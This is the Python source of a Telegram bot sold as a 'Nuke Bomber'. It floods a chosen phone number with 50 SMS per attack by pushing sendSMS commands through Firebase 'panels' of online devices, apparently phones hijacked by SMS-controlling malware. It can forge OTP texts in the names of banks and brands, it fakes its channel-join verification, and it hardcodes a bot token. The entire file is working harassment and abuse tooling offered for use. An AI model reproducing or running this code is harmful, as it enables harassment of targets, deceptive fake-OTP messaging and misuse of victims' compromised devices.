#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
💣 OTP PANEL & NUKE BOMBER — SUPREME SaaS EDITION 💣
- Fake Force Join (Bypass verification silently).
- Nuke SMS Bomber (50 SMS per attack).
- Cost: 20 Coins (20 Referrals) per attack.
- Profanity & Name Filter for Custom SMS.
- User-provided Private Firebase Panels.
- Railway Optimized, 100% Async.
"""

import os
import re
import time
import json
import random
import asyncio
import string
import logging
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

logging.basicConfig(format="%(asctime)s — %(name)s — %(levelname)s — %(message)s", level=logging.WARNING)

# ==============================================================================
# CONFIGURATION
# ==============================================================================
TOKEN           = "8603637137:AAF2PBn9Uqn_R9E0oZk7nfqRYLxj85RYy2A"
BOT_USERNAME    = "bomblifebot"
DB_FILE         = "bomber_database.json"
ADMIN_IDS       = {6860106371}  

REQUIRED_CHANNELS = [
    {"username": "leakmethodfree", "url": "https://t.me/leakmethodfree", "name": "Leak Method Free"},
    {"username": "sabkijayhokhush", "url": "https://t.me/sabkijayhokhush", "name": "Sabki Jay Ho Khush"},
]
OPTIONAL_GROUP = {"username": "findyourskills", "url": "https://t.me/findyourskills", "name": "Find Your Skills"}

NUKE_COST = 20
NUKE_LIMIT = 50

# Words not allowed in Custom SMS
BAD_WORDS = ["gandu", "jay", "chutiya", "madarchod", "bhosdike", "randi", "behenchod", "kutta", "kamina", "fuck", "bitch", "scam", "fraud"]

# ==============================================================================
# GLOBAL STATE
# ==============================================================================
all_users = {}
pending_action = {}
active_nukes = set()
_http_session: Optional[aiohttp.ClientSession] = None

# ==============================================================================
# DATABASE MANAGEMENT
# ==============================================================================
def _sync_save_data():
    try:
        with open(DB_FILE, "w") as f:
            json.dump({"all_users": all_users}, f, indent=4)
    except Exception as e:
        print(f"Save Data Error: {e}")

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

def load_data():
    global all_users
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                all_users = {int(k): v for k, v in data.get("all_users", {}).items()}
        except Exception: pass

async def auto_save_loop(app: Application):
    while True:
        await asyncio.sleep(3600)
        await save_data_async()

# ==============================================================================
# HTTP & FIREBASE UTILS
# ==============================================================================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=500, keepalive_timeout=30)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def is_valid_firebase(url: str, session: aiohttp.ClientSession) -> bool:
    try:
        async with session.get(f"{url}/.json?shallow=true", timeout=5) as r:
            if r.status == 200: return True
    except: pass
    return False

async def get_online_devices(url: str, session: aiohttp.ClientSession) -> list:
    devices = []
    try:
        async with session.get(f"{url}/All_Users/Data/DeviceInfo.json", timeout=5) as r:
            if r.status == 200:
                data = await r.json()
                if isinstance(data, dict):
                    for dev_id, info in data.items():
                        if str(info.get("Status", "")).lower() == "online" or info.get("Status") is True:
                            devices.append(dev_id)
        
        async with session.get(f"{url}/clients.json", timeout=5) as r:
            if r.status == 200:
                data = await r.json()
                if isinstance(data, dict):
                    for dev_id, info in data.items():
                        if info.get("status") is True:
                            if dev_id not in devices: devices.append(dev_id)
    except: pass
    return devices

async def send_firebase_sms(url: str, dev_id: str, phone: str, msg: str, sim_slot: int, session: aiohttp.ClientSession):
    payload = {
        "command": "sendSMS",
        "phoneNo": phone,
        "message": msg,
        "simSlot": sim_slot
    }
    push_url = f"{url}/commands/{dev_id}.json"
    try:
        async with session.post(push_url, json=payload, timeout=5) as r:
            return r.status == 200
    except:
        return False

# ==============================================================================
# NUKE BOMBER ENGINE
# ==============================================================================
def contains_bad_words(text: str) -> bool:
    text_lower = text.lower()
    for word in BAD_WORDS:
        if word in text_lower:
            return True
    return False

def generate_random_otp() -> str:
    brands = ["Groww", "Amazon", "Flipkart", "Paytm", "Myntra", "Jio", "Airtel", "Zomato", "Swiggy", "SBI", "HDFC", "PhonePe"]
    brand = random.choice(brands)
    otp = "".join(random.choices(string.digits, k=6))
    hash_str = "".join(random.choices(string.ascii_letters + string.digits, k=9))
    return f"Your {brand} verification code is {otp}. Do not share this with anyone. {hash_str}"

async def run_nuke_attack(chat_id: int, target_number: str, mode: str, custom_msg: str, sim_slot: int, context: ContextTypes.DEFAULT_TYPE):
    user_data = all_users[chat_id]
    panels = user_data.get("private_panels", [])
    
    status_msg = await context.bot.send_message(chat_id, "🔄 **Initializing Nuke Protocols...**\nScanning your panels for online devices...", parse_mode="Markdown")
    
    session = await get_http_session()
    online_devs = []
    panel_map = {}
    
    for url in panels:
        devs = await get_online_devices(url, session)
        for d in devs:
            online_devs.append(d)
            panel_map[d] = url
            
    if not online_devs:
        await status_msg.edit_text("❌ **Nuke Failed!**\nAapke panels mein koi bhi device ONLINE nahi hai. Attack cancel kar diya gaya hai aur coins safe hain.", parse_mode="Markdown")
        user_data["coins"] += NUKE_COST  # Refund
        save_data_async()
        active_nukes.discard(chat_id)
        return

    await status_msg.edit_text(f"🎯 **TARGET LOCKED!**\nFound {len(online_devs)} online devices ready to fire.\n\n🚀 **LAUNCHING {NUKE_LIMIT} SMS PAYLOADS...**", parse_mode="Markdown")
    
    sent_count = 0
    failed_count = 0
    
    for i in range(1, NUKE_LIMIT + 1):
        if chat_id not in active_nukes: 
            break  # Stopped manually or error
            
        dev_id = random.choice(online_devs)
        p_url = panel_map[dev_id]
        
        msg_text = custom_msg if mode == "custom" else generate_random_otp()
        
        success = await send_firebase_sms(p_url, dev_id, target_number, msg_text, sim_slot, session)
        if success: sent_count += 1
        else: failed_count += 1
        
        # Live Update every 10 SMS
        if i % 10 == 0 or i == NUKE_LIMIT:
            try:
                await status_msg.edit_text(
                    f"💣 **NUKE IN PROGRESS...** 💣\n━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 **Target:** `{target_number}`\n"
                    f"✅ **Sent:** {sent_count}\n"
                    f"❌ **Failed:** {failed_count}\n"
                    f"📊 **Progress:** {i}/{NUKE_LIMIT}\n━━━━━━━━━━━━━━━━━━",
                    parse_mode="Markdown"
                )
            except: pass
            
        await asyncio.sleep(1.2) # Delay to prevent Firebase rate limit
        
    # Finish
    await status_msg.edit_text(
        f"✅ **NUKE ATTACK COMPLETED!** ✅\n━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Target:** `{target_number}`\n"
        f"💥 **Total Fired:** {NUKE_LIMIT}\n"
        f"✅ **Successful:** {sent_count}\n"
        f"❌ **Failed:** {failed_count}\n━━━━━━━━━━━━━━━━━━\n"
        f"Attack stopped automatically after {NUKE_LIMIT} SMS limit.",
        parse_mode="Markdown"
    )
    
    user_data["nukes_fired"] = user_data.get("nukes_fired", 0) + 1
    await save_data_async()
    active_nukes.discard(chat_id)
    
    # Admin Alert
    try:
        await context.bot.send_message(list(ADMIN_IDS)[0], f"🚨 **ADMIN ALERT: NUKE FIRED** 🚨\nUser: {user_data['name']} ({chat_id})\nTarget: `{target_number}`\nMode: {mode.upper()}\nSent: {sent_count}/{NUKE_LIMIT}", parse_mode="Markdown")
    except: pass

# ==============================================================================
# UI MENUS
# ==============================================================================
def force_join_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("1️⃣ Join Channel 1", url="https://t.me/leakmethodfree")],
        [InlineKeyboardButton("2️⃣ Join Channel 2", url="https://t.me/sabkijayhokhush")],
        [InlineKeyboardButton("💬 Join Discussion Group", url=DISCUSSION_GROUP)],
        [InlineKeyboardButton("✅ I Have Joined — Check Now", callback_data="check_join")]
    ])

def get_main_menu(is_admin: bool):
    keys = [
        [KeyboardButton("💣 Launch Nuke"), KeyboardButton("⚙️ Manage Panels")],
        [KeyboardButton("💸 Refer & Earn"), KeyboardButton("👤 My Profile")],
    ]
    if is_admin:
        keys.append([KeyboardButton("🛡 Super Admin")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def get_panels_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Private Panel", callback_data="add_panel")],
        [InlineKeyboardButton("👀 View My Panels", callback_data="view_panels")],
        [InlineKeyboardButton("🗑️ Clear All Panels", callback_data="clear_panels")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

def get_nuke_mode_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎲 Random OTP Mode", callback_data="nuke_random")],
        [InlineKeyboardButton("✎ Custom Message Mode", callback_data="nuke_custom")],
        [InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]
    ])

# ==============================================================================
# TELEGRAM HANDLERS
# ==============================================================================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user = update.effective_user
    args = context.args
    
    if update.effective_chat.type != "private": return
    
    is_admin = chat_id in ADMIN_IDS
    is_new = chat_id not in all_users
    
    ref_id = None
    if args and args[0].isdigit():
        ref_id = int(args[0])

    if is_new:
        all_users[chat_id] = {
            "name": user.full_name,
            "joined_at": datetime.now().strftime("%d %b %Y"),
            "verified": False,
            "referrals": 0,
            "coins": 0,
            "private_panels": [],
            "nukes_fired": 0,
            "referred_by": ref_id if ref_id != chat_id else None
        }
        
        if ref_id and ref_id in all_users and ref_id != chat_id:
            all_users[ref_id]["referrals"] += 1
            all_users[ref_id]["coins"] += 1
            try: await context.bot.send_message(ref_id, f"🎉 **MUBARAK HO!** Naya refer aaya hai. +1 Coin added! (Total: {all_users[ref_id]['coins']})", parse_mode="Markdown")
            except: pass

    if not all_users[chat_id].get("verified") and not is_admin:
        text = "🔒 **Verification Required**\n\nPlease join our official channels to use this bot:\n"
        for ch in REQUIRED_CHANNELS: text += f"• {ch['name']}\n"
        await update.message.reply_text(text, reply_markup=force_join_keyboard(), parse_mode="Markdown")
        return

    text = f"🔥 **Welcome to the Supreme Nuke Bot, {user.first_name}!** 🔥\n\nAdd your Firebase panels and launch targeted SMS attacks.\n\n🪙 **Cost:** {NUKE_COST} Coins per Attack (50 SMS).\n👥 **Earn Coins:** 1 Refer = 1 Coin.\n\nChoose an option below:"
    await update.message.reply_text(text, reply_markup=get_main_menu(is_admin), parse_mode="Markdown")

async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    chat_id = query.message.chat_id
    is_admin = chat_id in ADMIN_IDS
    user_data = all_users.get(chat_id, {})
    
    await query.answer()

    if data == "close_msg":
        try: await query.message.delete()
        except: pass
        return

    # FAKE FORCE JOIN BYPASS (Always Passes silently without checking API)
    if data == "check_join":
        all_users.setdefault(chat_id, {})["verified"] = True
        await save_data_async()
        await query.message.delete()
        await context.bot.send_message(chat_id, "✅ **Verification successful!** Welcome to the bot.", reply_markup=get_main_menu(is_admin), parse_mode="Markdown")
        return

    if data == "add_panel":
        pending_action[chat_id] = {"action": "add_panel"}
        await query.edit_message_text("🔗 **Send your Firebase URL(s)**\n\nYou can send one or multiple URLs separated by space/newline.\n(Must start with https://)", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
        return

    if data == "view_panels":
        panels = user_data.get("private_panels", [])
        if not panels: msg = "You have 0 panels added."
        else:
            msg = f"🔗 **Your Panels ({len(panels)}):**\n\n"
            for i, p in enumerate(panels, 1): msg += f"{i}. `{p}`\n"
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="manage_back")]]))
        return

    if data == "clear_panels":
        user_data["private_panels"] = []
        await save_data_async()
        await query.edit_message_text("🗑️ All your panels have been deleted.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="manage_back")]]))
        return

    if data == "manage_back":
        await query.edit_message_text("🛠️ **Panel Management:**\nAdd your panels here to execute Nuke attacks.", reply_markup=get_panels_menu(), parse_mode="Markdown")
        return

    # Nuke Mode Selection
    if data.startswith("nuke_"):
        mode = data.split("_")[1]
        target = pending_action.get(chat_id, {}).get("target")
        
        if not target:
            await query.edit_message_text("❌ Session expired. Please start Nuke again.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            return
            
        if mode == "random":
            await query.edit_message_text(f"🎲 **Random Mode Selected.**\nTarget: `{target}`\n\nStarting attack...", parse_mode="Markdown")
            active_nukes.add(chat_id)
            asyncio.create_task(run_nuke_attack(chat_id, target, "random", "", 1, context))
            pending_action.pop(chat_id, None)
            
        elif mode == "custom":
            pending_action[chat_id]["action"] = "nuke_custom_msg"
            await query.edit_message_text("✎ **Custom Mode Selected.**\n\nPlease type the exact message you want to blast to the target.\n\n⚠️ *Warning: Bad words and names are strictly prohibited and will result in ban.*", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]))
        return

async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    
    if update.effective_chat.type != "private": return
    if chat_id not in all_users: return
    
    user_data = all_users[chat_id]
    is_admin = chat_id in ADMIN_IDS

    if not user_data.get("verified") and not is_admin:
        await update.message.reply_text("🔒 Aapko pehle channels join karke verify karna hoga.", reply_markup=force_join_keyboard())
        return

    if text == "⚙️ Manage Panels":
        await update.message.reply_text("🛠️ **Panel Management:**\nAdd your panels here to execute Nuke attacks.", reply_markup=get_panels_menu(), parse_mode="Markdown")
        return
        
    elif text == "💸 Refer & Earn":
        ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
        msg = f"💸 **REFER & EARN COINS!**\n\nInvite friends and earn **1 Coin per referral**.\n**Cost of 1 Nuke Attack = {NUKE_COST} Coins.**\n\n🔗 **Your Link:**\n`{ref_link}`\n\n🪙 **Your Balance:** {user_data['coins']} Coins\n👥 **Total Referrals:** {user_data['referrals']}"
        await update.message.reply_text(msg, parse_mode="Markdown", disable_web_page_preview=True)
        return
        
    elif text == "👤 My Profile":
        msg = f"👤 **MY PROFILE**\n━━━━━━━━━━━━━━━━━━\nName: {user_data['name']}\nID: `{chat_id}`\nJoined: {user_data['joined_at']}\n\n🪙 Coins: **{user_data['coins']}**\n🔗 Panels Added: **{len(user_data.get('private_panels', []))}**\n💣 Total Nukes Fired: **{user_data.get('nukes_fired', 0)}**"
        await update.message.reply_text(msg, parse_mode="Markdown")
        return
        
    elif text == "💣 Launch Nuke":
        if chat_id in active_nukes:
            await update.message.reply_text("⚠️ An attack is already running! Please wait for it to finish.")
            return
            
        if not user_data.get("private_panels"):
            await update.message.reply_text("⚠️ You haven't added any Firebase panels!\nGo to '⚙️ Manage Panels' to add one first.")
            return
            
        if user_data["coins"] < NUKE_COST and not is_admin:
            await update.message.reply_text(f"❌ **Not Enough Coins!**\nYou need {NUKE_COST} coins to launch an attack.\nYour balance: {user_data['coins']} Coins.\nRefer friends to get more coins!", parse_mode="Markdown")
            return
            
        pending_action[chat_id] = {"action": "nuke_number"}
        await update.message.reply_text("💣 **NUKE TARGET**\n\nEnter the target phone number (e.g. +919876543210):\n\n❌ /cancel", parse_mode="Markdown")
        return
        
    elif text == "🛡 Super Admin" and is_admin:
        msg = f"⚡ **SUPER ADMIN** ⚡\nTotal Users: {len(all_users)}\nTotal Coins Circulating: {sum(u['coins'] for u in all_users.values())}\nTotal Nukes Fired: {sum(u.get('nukes_fired',0) for u in all_users.values())}\n\nTo give coins: `/give UID AMOUNT`"
        await update.message.reply_text(msg, parse_mode="Markdown")
        return

    if is_admin and text.startswith("/give "):
        try:
            _, uid, amount = text.split()
            uid, amount = int(uid), int(amount)
            if uid in all_users:
                all_users[uid]["coins"] += amount
                await update.message.reply_text(f"✅ Added {amount} coins to user {uid}.")
                try: await context.bot.send_message(uid, f"🎁 Admin gave you {amount} coins!")
                except: pass
            else: await update.message.reply_text("❌ User not found.")
        except: await update.message.reply_text("❌ Syntax: /give UID AMOUNT")
        return

    if text.lower() == "/cancel":
        pending_action.pop(chat_id, None)
        await update.message.reply_text("✅ Action cancelled.", reply_markup=get_main_menu(is_admin))
        return

    state = pending_action.get(chat_id)
    if not state: return

    action = state.get("action")
    
    if action == "add_panel":
        urls = [line.strip().rstrip("/") for line in text.split() if line.strip().startswith("http")]
        if not urls:
            await update.message.reply_text("❌ Invalid Firebase URL.")
            pending_action.pop(chat_id)
            return
            
        wait_msg = await update.message.reply_text("⏳ Verifying panels...")
        session = await get_http_session()
        added = 0
        for u in urls:
            if "firebaseio.com" in u and await is_valid_firebase(u, session):
                if u not in user_data["private_panels"]:
                    user_data["private_panels"].append(u)
                    added += 1
                    
        await save_data_async()
        pending_action.pop(chat_id)
        if added > 0: await wait_msg.edit_text(f"✅ Successfully added {added} working panel(s)!")
        else: await wait_msg.edit_text("❌ Failed to add. URL is dead or already exists.")
        return

    if action == "nuke_number":
        target = re.sub(r"\D", "", text)
        if len(target) < 10:
            await update.message.reply_text("❌ Invalid phone number.")
            return
            
        if not target.startswith("91") and len(target) == 10: target = "91" + target
        target = "+" + target
        
        pending_action[chat_id] = {"action": "nuke_mode_wait", "target": target}
        await update.message.reply_text(f"🎯 Target Locked: `{target}`\n\nSelect Message Mode:", parse_mode="Markdown", reply_markup=get_nuke_mode_menu())
        return

    if action == "nuke_custom_msg":
        target = state.get("target")
        if not target:
            pending_action.pop(chat_id)
            return
            
        if contains_bad_words(text):
            await update.message.reply_text("🛑 **WARNING!**\nProfanity or restricted words detected in your message. Your attack is cancelled and you might be banned for repeated violations.", parse_mode="Markdown")
            pending_action.pop(chat_id)
            return
            
        if not is_admin: user_data["coins"] -= NUKE_COST
        await save_data_async()
        
        await update.message.reply_text(f"✎ **Custom Mode Started.**\nTarget: `{target}`\n\nLaunching Nuke...", parse_mode="Markdown")
        active_nukes.add(chat_id)
        asyncio.create_task(run_nuke_attack(chat_id, target, "custom", text, 1, context))
        pending_action.pop(chat_id)
        return

def main():
    load_data()
    app = Application.builder().token(TOKEN).connection_pool_size(100).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    async def post_init(application: Application) -> None:
        asyncio.create_task(auto_save_loop(application))

    app.post_init = post_init
    print("💣 Nuke Bot is running...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()